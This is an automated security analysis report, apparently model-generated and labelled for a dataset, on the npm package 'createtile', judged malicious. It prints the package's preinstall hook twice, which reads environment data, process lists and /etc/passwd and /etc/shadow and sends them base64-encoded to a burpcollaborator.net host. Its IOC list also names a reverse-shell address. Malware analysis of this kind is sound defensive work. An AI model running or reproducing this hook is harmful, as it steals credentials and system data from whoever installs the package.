# NPM Package Security Analysis Report

## Package Information
- **Package Name:** `createtile`
- **Version:** `99.0.0`
- **Scan Date:** 2026-03-27T14:50:08

---

## Final Security Verdict: **MALICIOUS** (Policy: Blocked)

**Risk Level:** SEV-2 (High) **HIGH**  
**Confidence Score:** 80.0%

### Executive Summary
The package 'createtile' is making network calls to a known exfiltration collector domain (linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net) during the pre-install command. This could potentially indicate a supply chain attack. The detected behaviors have no legitimate justification based on the package's stated purpose.

---

## THREAT PROFILE

**ATTACK TYPE:** Data Exfiltration

**PRIMARY TACTICS:**
- Exfiltration (File/Data)
- Persistence (Install Hook)

**ATTACK VECTOR IOCs:**
- `postinstallhook`
- `bash-c`
- `34.x.x.x:4444`
- `reverseshell`

**KEY RISK FACTORS:**
- The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain.
- The package.json scripts.preinstall command is a known install hook.

---

## EVIDENCE SUMMARY

### MALICIOUS INDICATORS DETECTED

#### 1. Data Exfiltration [HIGH]
**Description:** The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain. The domain is 'linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net'. This could potentially indicate data exfiltration.

```
export HOSTNAME&&BCNET="linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net";sleep.5;ping-c1$BCNET;foriinenv"psaux"cat/proc/version/proc/net/fib_trie/proc/net/if_inet6"cat/etc/hosts/etc/passwd/etc/shadow";docurlhttps://$BCNET-ski-m30-d"$($i2>&1|base64-w0)";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true
```

#### 2. Install Hook [HIGH]
**Description:** The package.json scripts.preinstall command is a known install hook. This could potentially indicate a supply chain attack.

```
export HOSTNAME&&BCNET="linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net";sleep.5;ping-c1$BCNET;foriinenv"psaux"cat/proc/version/proc/net/fib_trie/proc/net/if_inet6"cat/etc/hosts/etc/passwd/etc/shadow";docurlhttps://$BCNET-ski-m30-d"$($i2>&1|base64-w0)";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true
```

**Attack Chain:** The package 'createtile' is making network calls to a known exfiltration collector domain (linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net) during the pre-install command. This could potentially indicate a supply chain attack.

**Legitimacy Assessment:** The package has no description/README and the behavior is clearly anomalous.

---

## RECOMMENDATIONS

### Immediate Action
**DO NOT INSTALL — Remove immediately if already installed**

### Remediation Steps
1. Review package source code and dependencies
1. Inspect install/preinstall scripts in package.json
1. Report to npm security team if confirmed malicious

---

## TECHNICAL ANALYSIS DETAILS

**Behaviors Detected:** 2
**Risk Categories:** data_exfiltration, install_hook
**Highest Detection Confidence:** 83.0%
**Chain Score:** 0.78
**Chain Narrative:** The package 'createtile' is making network calls to a known exfiltration collector domain (linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net) during the pre-install command. This could potentially indicate a supply chain attack.

---

*Analysis Version: semantic_v2.0*  
*Model: deepseek-coder-6.7b-instruct*  
*Ground Truth Label: malicious*
